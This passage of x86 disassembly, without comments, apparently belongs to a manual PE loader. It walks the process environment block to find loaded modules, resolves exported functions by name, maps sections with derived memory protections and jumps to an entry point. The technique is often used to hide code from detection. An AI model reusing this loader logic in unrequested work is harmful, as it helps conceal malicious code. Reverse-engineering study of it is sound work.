  40167d:	89 45 8c             	mov    %eax,-0x74(%ebp)
  401680:	89 7d 88             	mov    %edi,-0x78(%ebp)
  401683:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401686:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401689:	0f 84 d2 00 00 00    	je     0x401761
  40168f:	eb 00                	jmp    0x401691
  401691:	8b 45 88             	mov    -0x78(%ebp),%eax
  401694:	83 e8 03             	sub    $0x3,%eax
  401697:	89 45 80             	mov    %eax,-0x80(%ebp)
  40169a:	0f 84 87 fe ff ff    	je     0x401527
  4016a0:	eb 00                	jmp    0x4016a2
  4016a2:	8b 45 88             	mov    -0x78(%ebp),%eax
  4016a5:	83 e8 0a             	sub    $0xa,%eax
  4016a8:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  4016ab:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  4016b1:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  4016b4:	0f 84 86 fe ff ff    	je     0x401540
  4016ba:	e9 c4 00 00 00       	jmp    0x401783
  4016bf:	b8 01 00 00 00       	mov    $0x1,%eax
  4016c4:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4016c7:	8b 91 a4 00 00 00    	mov    0xa4(%ecx),%edx
  4016cd:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  4016d3:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4016d6:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4016d9:	0f 84 a4 00 00 00    	je     0x401783
  4016df:	e9 84 fe ff ff       	jmp    0x401568
  4016e4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4016e7:	05 08 00 00 00       	add    $0x8,%eax
  4016ec:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  4016f2:	89 45 98             	mov    %eax,-0x68(%ebp)
  4016f5:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  4016f8:	e9 5f ff ff ff       	jmp    0x40165c
  4016fd:	31 c0                	xor    %eax,%eax
  4016ff:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401702:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  401708:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  40170e:	81 c1 01 00 00 00    	add    $0x1,%ecx
  401714:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401717:	01 ca                	add    %ecx,%edx
  401719:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  40171f:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  401722:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401725:	74 5c                	je     0x401783
  401727:	e9 11 ff ff ff       	jmp    0x40163d
  40172c:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40172f:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  401732:	8b 55 b0             	mov    -0x50(%ebp),%edx
  401735:	8b 75 b8             	mov    -0x48(%ebp),%esi
  401738:	05 f8 ff ff ff       	add    $0xfffffff8,%eax
  40173d:	8b 3a                	mov    (%edx),%edi
  40173f:	c1 e8 01             	shr    $0x1,%eax
  401742:	3d 00 00 00 00       	cmp    $0x0,%eax
  401747:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  40174a:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  40174d:	89 55 a0             	mov    %edx,-0x60(%ebp)
  401750:	89 7d dc             	mov    %edi,-0x24(%ebp)
  401753:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401759:	0f 84 85 fe ff ff    	je     0x4015e4
  40175f:	eb 83                	jmp    0x4016e4
  401761:	8b 45 90             	mov    -0x70(%ebp),%eax
  401764:	05 02 00 00 00       	add    $0x2,%eax
  401769:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  40176c:	81 f9 00 00 00 00    	cmp    $0x0,%ecx
  401772:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  401775:	89 45 98             	mov    %eax,-0x68(%ebp)
  401778:	0f 84 66 fe ff ff    	je     0x4015e4
  40177e:	e9 d9 fe ff ff       	jmp    0x40165c
  401783:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401786:	83 c4 7c             	add    $0x7c,%esp
  401789:	5e                   	pop    %esi
  40178a:	5f                   	pop    %edi
  40178b:	5b                   	pop    %ebx
  40178c:	5d                   	pop    %ebp
  40178d:	c3                   	ret
  40178e:	55                   	push   %ebp
  40178f:	89 e5                	mov    %esp,%ebp
  401791:	53                   	push   %ebx
  401792:	57                   	push   %edi
  401793:	56                   	push   %esi
  401794:	81 ec d0 00 00 00    	sub    $0xd0,%esp
  40179a:	8b 45 08             	mov    0x8(%ebp),%eax
  40179d:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%ebp)
  4017a4:	8b 48 38             	mov    0x38(%eax),%ecx
  4017a7:	8b 50 14             	mov    0x14(%eax),%edx
  4017aa:	8b 70 18             	mov    0x18(%eax),%esi
  4017ad:	8b 78 2c             	mov    0x2c(%eax),%edi
  4017b0:	8b 58 30             	mov    0x30(%eax),%ebx
  4017b3:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4017b6:	89 e0                	mov    %esp,%eax
  4017b8:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4017bb:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4017be:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4017c1:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4017c4:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  4017c7:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  4017ca:	89 48 0c             	mov    %ecx,0xc(%eax)
  4017cd:	89 58 04             	mov    %ebx,0x4(%eax)
  4017d0:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4017d3:	89 08                	mov    %ecx,(%eax)
  4017d5:	c7 40 08 04 00 00 00 	movl   $0x4,0x8(%eax)
  4017dc:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  4017df:	89 55 a0             	mov    %edx,-0x60(%ebp)
  4017e2:	89 75 9c             	mov    %esi,-0x64(%ebp)
  4017e5:	ff d2                	call   *%edx
  4017e7:	83 ec 10             	sub    $0x10,%esp
  4017ea:	31 c9                	xor    %ecx,%ecx
  4017ec:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  4017ef:	8b 72 30             	mov    0x30(%edx),%esi
  4017f2:	8b 7d a8             	mov    -0x58(%ebp),%edi
  4017f5:	89 3c 24             	mov    %edi,(%esp)
  4017f8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4017ff:	00 
  401800:	89 74 24 08          	mov    %esi,0x8(%esp)
  401804:	89 45 98             	mov    %eax,-0x68(%ebp)
  401807:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40180a:	e8 3e 09 00 00       	call   0x40214d
  40180f:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401812:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401815:	8b 55 a8             	mov    -0x58(%ebp),%edx
  401818:	89 14 24             	mov    %edx,(%esp)
  40181b:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40181f:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  401822:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401826:	e8 f5 0b 00 00       	call   0x402420
  40182b:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40182e:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401831:	89 0c 24             	mov    %ecx,(%esp)
  401834:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40183b:	00 
  40183c:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  40183f:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401843:	e8 05 09 00 00       	call   0x40214d
  401848:	89 e0                	mov    %esp,%eax
  40184a:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40184d:	89 48 0c             	mov    %ecx,0xc(%eax)
  401850:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  401853:	89 08                	mov    %ecx,(%eax)
  401855:	c7 40 08 02 00 00 00 	movl   $0x2,0x8(%eax)
  40185c:	c7 40 04 00 04 00 00 	movl   $0x400,0x4(%eax)
  401863:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401866:	ff d0                	call   *%eax
  401868:	83 ec 10             	sub    $0x10,%esp
  40186b:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40186e:	8b 51 3c             	mov    0x3c(%ecx),%edx
  401871:	66 89 d6             	mov    %dx,%si
  401874:	66 81 fe 00 00       	cmp    $0x0,%si
  401879:	8b 7d a8             	mov    -0x58(%ebp),%edi
  40187c:	89 45 90             	mov    %eax,-0x70(%ebp)
  40187f:	89 4d 8c             	mov    %ecx,-0x74(%ebp)
  401882:	89 55 88             	mov    %edx,-0x78(%ebp)
  401885:	89 7d 84             	mov    %edi,-0x7c(%ebp)
  401888:	0f 85 01 01 00 00    	jne    0x40198f
  40188e:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401891:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  401894:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  401897:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  40189d:	89 45 80             	mov    %eax,-0x80(%ebp)
  4018a0:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  4018a6:	0f 85 d0 01 00 00    	jne    0x401a7c
  4018ac:	31 c0                	xor    %eax,%eax
  4018ae:	b9 58 00 00 00       	mov    $0x58,%ecx
  4018b3:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  4018b6:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4018b9:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4018bc:	03 77 10             	add    0x10(%edi),%esi
  4018bf:	8b 5f 4c             	mov    0x4c(%edi),%ebx
  4018c2:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4018c5:	8b 5f 48             	mov    0x48(%edi),%ebx
  4018c8:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  4018cb:	8b 5f 54             	mov    0x54(%edi),%ebx
  4018ce:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  4018d1:	8b 5f 34             	mov    0x34(%edi),%ebx
  4018d4:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4018d7:	8b 5f 1c             	mov    0x1c(%edi),%ebx
  4018da:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4018dd:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4018e0:	89 14 24             	mov    %edx,(%esp)
  4018e3:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4018ea:	00 
  4018eb:	c7 44 24 08 58 00 00 	movl   $0x58,0x8(%esp)
  4018f2:	00 
  4018f3:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4018f9:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  4018ff:	e8 49 08 00 00       	call   0x40214d
  401904:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401907:	8b 30                	mov    (%eax),%esi
  401909:	8b 78 04             	mov    0x4(%eax),%edi
  40190c:	8b 58 08             	mov    0x8(%eax),%ebx
  40190f:	8b 68 0c             	mov    0xc(%eax),%ebp
  401912:	8b 60 10             	mov    0x10(%eax),%esp
  401915:	8b 40 14             	mov    0x14(%eax),%eax
  401918:	ff e0                	jmp    *%eax
  40191a:	81 c4 d0 00 00 00    	add    $0xd0,%esp
  401920:	5e                   	pop    %esi
  401921:	5f                   	pop    %edi
  401922:	5b                   	pop    %ebx
  401923:	5d                   	pop    %ebp
  401924:	c3                   	ret
  401925:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401928:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  40192e:	c1 e9 1e             	shr    $0x1e,%ecx
  401931:	8b 95 70 ff ff ff    	mov    -0x90(%ebp),%edx
  401937:	c1 ea 1d             	shr    $0x1d,%edx
  40193a:	8b b5 70 ff ff ff    	mov    -0x90(%ebp),%esi
  401940:	c1 ee 1f             	shr    $0x1f,%esi
  401943:	81 e1 01 00 00 00    	and    $0x1,%ecx
  401949:	81 e2 01 00 00 00    	and    $0x1,%edx
  40194f:	c1 e1 04             	shl    $0x4,%ecx
  401952:	01 c8                	add    %ecx,%eax
  401954:	c1 e6 03             	shl    $0x3,%esi
  401957:	01 f0                	add    %esi,%eax
  401959:	c1 e2 02             	shl    $0x2,%edx
  40195c:	01 d0                	add    %edx,%eax
  40195e:	8b 00                	mov    (%eax),%eax
  401960:	89 e1                	mov    %esp,%ecx
  401962:	8d 55 b8             	lea    -0x48(%ebp),%edx
  401965:	89 51 0c             	mov    %edx,0xc(%ecx)
  401968:	89 41 08             	mov    %eax,0x8(%ecx)
  40196b:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401971:	89 41 04             	mov    %eax,0x4(%ecx)
  401974:	8b 95 68 ff ff ff    	mov    -0x98(%ebp),%edx
  40197a:	89 11                	mov    %edx,(%ecx)
  40197c:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  40197f:	ff d1                	call   *%ecx
  401981:	83 ec 10             	sub    $0x10,%esp
  401984:	89 85 64 ff ff ff    	mov    %eax,-0x9c(%ebp)
  40198a:	e9 ba 00 00 00       	jmp    0x401a49
  40198f:	8b 45 88             	mov    -0x78(%ebp),%eax
  401992:	05 ff ff 00 00       	add    $0xffff,%eax
  401997:	8b 4d 88             	mov    -0x78(%ebp),%ecx
  40199a:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  4019a0:	25 ff ff 00 00       	and    $0xffff,%eax
  4019a5:	05 01 00 00 00       	add    $0x1,%eax
  4019aa:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4019ad:	01 c2                	add    %eax,%edx
  4019af:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4019b5:	81 c1 01 00 00 00    	add    $0x1,%ecx
  4019bb:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4019be:	01 c8                	add    %ecx,%eax
  4019c0:	89 45 8c             	mov    %eax,-0x74(%ebp)
  4019c3:	89 55 84             	mov    %edx,-0x7c(%ebp)
  4019c6:	e9 c3 fe ff ff       	jmp    0x40188e
  4019cb:	8b 85 60 ff ff ff    	mov    -0xa0(%ebp),%eax
  4019d1:	8b 8d 5c ff ff ff    	mov    -0xa4(%ebp),%ecx
  4019d7:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4019da:	03 50 0c             	add    0xc(%eax),%edx
  4019dd:	8b 70 24             	mov    0x24(%eax),%esi
  4019e0:	8b 78 08             	mov    0x8(%eax),%edi
  4019e3:	8b 9d 58 ff ff ff    	mov    -0xa8(%ebp),%ebx
  4019e9:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  4019ef:	8b 9d 54 ff ff ff    	mov    -0xac(%ebp),%ebx
  4019f5:	c7 03 02 00 00 00    	movl   $0x2,(%ebx)
  4019fb:	8b 9d 50 ff ff ff    	mov    -0xb0(%ebp),%ebx
  401a01:	c7 03 04 00 00 00    	movl   $0x4,(%ebx)
  401a07:	8b 9d 4c ff ff ff    	mov    -0xb4(%ebp),%ebx
  401a0d:	c7 03 40 00 00 00    	movl   $0x40,(%ebx)
  401a13:	8b 9d 48 ff ff ff    	mov    -0xb8(%ebp),%ebx
  401a19:	c7 03 20 00 00 00    	movl   $0x20,(%ebx)
  401a1f:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  401a25:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
  401a2b:	89 8d 40 ff ff ff    	mov    %ecx,-0xc0(%ebp)
  401a31:	89 95 68 ff ff ff    	mov    %edx,-0x98(%ebp)
  401a37:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  401a3d:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%ebp)
  401a43:	0f 85 dc fe ff ff    	jne    0x401925
  401a49:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  401a4f:	05 01 00 00 00       	add    $0x1,%eax
  401a54:	8b 8d 44 ff ff ff    	mov    -0xbc(%ebp),%ecx
  401a5a:	81 c1 28 00 00 00    	add    $0x28,%ecx
  401a60:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  401a63:	39 d0                	cmp    %edx,%eax
  401a65:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  401a6b:	89 8d 60 ff ff ff    	mov    %ecx,-0xa0(%ebp)
  401a71:	0f 84 35 fe ff ff    	je     0x4018ac
  401a77:	e9 4f ff ff ff       	jmp    0x4019cb
  401a7c:	31 c0                	xor    %eax,%eax
  401a7e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401a81:	89 ca                	mov    %ecx,%edx
  401a83:	81 c2 1c 00 00 00    	add    $0x1c,%edx
  401a89:	89 ce                	mov    %ecx,%esi
  401a8b:	81 c6 18 00 00 00    	add    $0x18,%esi
  401a91:	89 cf                	mov    %ecx,%edi
  401a93:	81 c7 10 00 00 00    	add    $0x10,%edi
  401a99:	89 cb                	mov    %ecx,%ebx
  401a9b:	81 c3 14 00 00 00    	add    $0x14,%ebx
  401aa1:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
  401aa7:	8b 45 80             	mov    -0x80(%ebp),%eax
  401aaa:	05 18 00 00 00       	add    $0x18,%eax
  401aaf:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  401ab5:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  401abb:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  401abf:	89 85 34 ff ff ff    	mov    %eax,-0xcc(%ebp)
  401ac5:	8b 85 38 ff ff ff    	mov    -0xc8(%ebp),%eax
  401acb:	89 8d 58 ff ff ff    	mov    %ecx,-0xa8(%ebp)
  401ad1:	8b 8d 34 ff ff ff    	mov    -0xcc(%ebp),%ecx
  401ad7:	01 c8                	add    %ecx,%eax
  401ad9:	8b 8d 3c ff ff ff    	mov    -0xc4(%ebp),%ecx
  401adf:	89 8d 5c ff ff ff    	mov    %ecx,-0xa4(%ebp)
  401ae5:	89 9d 48 ff ff ff    	mov    %ebx,-0xb8(%ebp)
  401aeb:	89 95 4c ff ff ff    	mov    %edx,-0xb4(%ebp)
  401af1:	89 b5 50 ff ff ff    	mov    %esi,-0xb0(%ebp)
  401af7:	89 bd 54 ff ff ff    	mov    %edi,-0xac(%ebp)
  401afd:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  401b03:	e9 c3 fe ff ff       	jmp    0x4019cb
  401b08:	55                   	push   %ebp
  401b09:	89 e5                	mov    %esp,%ebp
  401b0b:	53                   	push   %ebx
  401b0c:	57                   	push   %edi
  401b0d:	56                   	push   %esi
  401b0e:	83 ec 4c             	sub    $0x4c,%esp
  401b11:	8b 45 08             	mov    0x8(%ebp),%eax
  401b14:	8d 0d 00 30 40 00    	lea    0x403000,%ecx
  401b1a:	31 d2                	xor    %edx,%edx
  401b1c:	89 0c 24             	mov    %ecx,(%esp)
  401b1f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401b26:	00 
  401b27:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401b2a:	89 55 ec             	mov    %edx,-0x14(%ebp)
  401b2d:	e8 51 01 00 00       	call   0x401c83
  401b32:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401b35:	66 89 ce             	mov    %cx,%si
  401b38:	66 81 fe 00 00       	cmp    $0x0,%si
  401b3d:	89 c2                	mov    %eax,%edx
  401b3f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b42:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401b45:	89 55 e0             	mov    %edx,-0x20(%ebp)
  401b48:	0f 84 b0 00 00 00    	je     0x401bfe
  401b4e:	eb 1e                	jmp    0x401b6e
  401b50:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401b53:	0f b7 08             	movzwl (%eax),%ecx
  401b56:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401b59:	8b 75 d8             	mov    -0x28(%ebp),%esi
  401b5c:	03 54 32 1c          	add    0x1c(%edx,%esi,1),%edx
  401b60:	8b 7d e8             	mov    -0x18(%ebp),%edi
  401b63:	03 3c 8a             	add    (%edx,%ecx,4),%edi
  401b66:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  401b69:	e9 ce 00 00 00       	jmp    0x401c3c
  401b6e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b71:	05 ff ff 00 00       	add    $0xffff,%eax
  401b76:	25 ff ff 00 00       	and    $0xffff,%eax
  401b7b:	05 01 00 00 00       	add    $0x1,%eax
  401b80:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401b83:	01 c1                	add    %eax,%ecx
  401b85:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401b88:	eb 74                	jmp    0x401bfe
  401b8a:	31 c0                	xor    %eax,%eax
  401b8c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401b8f:	81 c1 02 00 00 00    	add    $0x2,%ecx
  401b95:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401b98:	81 c2 01 00 00 00    	add    $0x1,%edx
  401b9e:	8b 75 cc             	mov    -0x34(%ebp),%esi
  401ba1:	39 f2                	cmp    %esi,%edx
  401ba3:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401ba6:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401ba9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401bac:	72 34                	jb     0x401be2
  401bae:	e9 89 00 00 00       	jmp    0x401c3c
  401bb3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401bb6:	89 c1                	mov    %eax,%ecx
  401bb8:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401bbb:	01 d1                	add    %edx,%ecx
  401bbd:	8b 75 e8             	mov    -0x18(%ebp),%esi
  401bc0:	8a 1c 0e             	mov    (%esi,%ecx,1),%bl
  401bc3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401bc6:	8a 3c 01             	mov    (%ecx,%eax,1),%bh
  401bc9:	38 fb                	cmp    %bh,%bl
  401bcb:	0f 94 c1             	sete   %cl
  401bce:	80 fb 00             	cmp    $0x0,%bl
  401bd1:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401bd4:	88 7d b7             	mov    %bh,-0x49(%ebp)
  401bd7:	88 4d b6             	mov    %cl,-0x4a(%ebp)
  401bda:	0f 84 93 00 00 00    	je     0x401c73
  401be0:	eb 65                	jmp    0x401c47
  401be2:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401be5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  401be8:	31 d2                	xor    %edx,%edx
  401bea:	8b 75 b0             	mov    -0x50(%ebp),%esi
  401bed:	8b 3c 86             	mov    (%esi,%eax,4),%edi
  401bf0:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401bf3:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401bf6:	89 7d bc             	mov    %edi,-0x44(%ebp)
  401bf9:	89 55 c0             	mov    %edx,-0x40(%ebp)
  401bfc:	eb b5                	jmp    0x401bb3
  401bfe:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c01:	31 c9                	xor    %ecx,%ecx
  401c03:	8b 40 78             	mov    0x78(%eax),%eax
  401c06:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401c09:	03 54 02 20          	add    0x20(%edx,%eax,1),%edx
  401c0d:	8b 75 e8             	mov    -0x18(%ebp),%esi
  401c10:	8b 7c 06 18          	mov    0x18(%esi,%eax,1),%edi
  401c14:	81 ff 00 00 00 00    	cmp    $0x0,%edi
  401c1a:	89 7d cc             	mov    %edi,-0x34(%ebp)
  401c1d:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401c20:	89 55 b0             	mov    %edx,-0x50(%ebp)
  401c23:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401c26:	74 14                	je     0x401c3c
  401c28:	31 c0                	xor    %eax,%eax
  401c2a:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401c2d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401c30:	03 4c 11 24          	add    0x24(%ecx,%edx,1),%ecx
  401c34:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401c37:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401c3a:	eb a6                	jmp    0x401be2
  401c3c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401c3f:	83 c4 4c             	add    $0x4c,%esp
  401c42:	5e                   	pop    %esi
  401c43:	5f                   	pop    %edi
  401c44:	5b                   	pop    %ebx
  401c45:	5d                   	pop    %ebp
  401c46:	c3                   	ret
  401c47:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401c4a:	05 01 00 00 00       	add    $0x1,%eax
  401c4f:	8a 4d b7             	mov    -0x49(%ebp),%cl
  401c52:	80 f9 00             	cmp    $0x0,%cl
  401c55:	0f 95 c2             	setne  %dl
  401c58:	8a 6d b6             	mov    -0x4a(%ebp),%ch
  401c5b:	20 d5                	and    %dl,%ch
  401c5d:	3d 20 00 00 00       	cmp    $0x20,%eax
  401c62:	0f 92 c2             	setb   %dl
  401c65:	20 d5                	and    %dl,%ch
  401c67:	f6 c5 01             	test   $0x1,%ch
  401c6a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401c6d:	0f 85 40 ff ff ff    	jne    0x401bb3
  401c73:	8a 45 b6             	mov    -0x4a(%ebp),%al
  401c76:	a8 01                	test   $0x1,%al
  401c78:	0f 85 d2 fe ff ff    	jne    0x401b50
  401c7e:	e9 07 ff ff ff       	jmp    0x401b8a
  401c83:	55                   	push   %ebp
  401c84:	89 e5                	mov    %esp,%ebp
  401c86:	53                   	push   %ebx
  401c87:	57                   	push   %edi
  401c88:	56                   	push   %esi
  401c89:	83 ec 44             	sub    $0x44,%esp
  401c8c:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c8f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c92:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401c95:	64 8b 15 18 00 00 00 	mov    %fs:0x18,%edx
  401c9c:	31 c0                	xor    %eax,%eax
  401c9e:	8b 52 30             	mov    0x30(%edx),%edx
  401ca1:	8b 52 0c             	mov    0xc(%edx),%edx
  401ca4:	89 d6                	mov    %edx,%esi
  401ca6:	81 c6 14 00 00 00    	add    $0x14,%esi
  401cac:	8b 52 14             	mov    0x14(%edx),%edx
  401caf:	39 f2                	cmp    %esi,%edx
  401cb1:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401cb4:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401cb7:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  401cba:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401cbd:	0f 84 d6 00 00 00    	je     0x401d99
  401cc3:	e9 1e 01 00 00       	jmp    0x401de6
  401cc8:	31 c0                	xor    %eax,%eax
  401cca:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401ccd:	8b 11                	mov    (%ecx),%edx
  401ccf:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401cd2:	39 f2                	cmp    %esi,%edx
  401cd4:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401cd7:	89 55 d8             	mov    %edx,-0x28(%ebp)
  401cda:	0f 84 b9 00 00 00    	je     0x401d99
  401ce0:	e9 cf 00 00 00       	jmp    0x401db4
  401ce5:	8a 45 d7             	mov    -0x29(%ebp),%al
  401ce8:	a8 01                	test   $0x1,%al
  401cea:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401ced:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401cf0:	0f 85 a3 00 00 00    	jne    0x401d99
  401cf6:	eb d0                	jmp    0x401cc8
  401cf8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cfb:	05 f8 ff ff ff       	add    $0xfffffff8,%eax
  401d00:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d03:	e9 91 00 00 00       	jmp    0x401d99
  401d08:	31 c0                	xor    %eax,%eax
  401d0a:	66 8b 4d ce          	mov    -0x32(%ebp),%cx
  401d0e:	66 c1 e9 01          	shr    $0x1,%cx
  401d12:	0f b7 d1             	movzwl %cx,%edx
  401d15:	66 81 f9 00 00       	cmp    $0x0,%cx
  401d1a:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401d1d:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401d20:	74 a6                	je     0x401cc8
  401d22:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401d25:	89 c1                	mov    %eax,%ecx
  401d27:	81 c1 01 00 00 00    	add    $0x1,%ecx
  401d2d:	8b 55 c0             	mov    -0x40(%ebp),%edx
  401d30:	66 8b 34 42          	mov    (%edx,%eax,2),%si
  401d34:	66 89 f7             	mov    %si,%di
  401d37:	66 81 c7 bf ff       	add    $0xffbf,%di
  401d3c:	66 89 f3             	mov    %si,%bx
  401d3f:	66 81 c3 20 00       	add    $0x20,%bx
  401d44:	66 81 ff 1a 00       	cmp    $0x1a,%di
  401d49:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401d4c:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  401d4f:	66 89 75 b6          	mov    %si,-0x4a(%ebp)
  401d53:	66 89 5d b4          	mov    %bx,-0x4c(%ebp)
  401d57:	72 08                	jb     0x401d61
  401d59:	66 8b 45 b6          	mov    -0x4a(%ebp),%ax
  401d5d:	66 89 45 b4          	mov    %ax,-0x4c(%ebp)
  401d61:	66 8b 45 b4          	mov    -0x4c(%ebp),%ax
  401d65:	8b 4d ec             	mov    -0x14(%ebp),%ecx
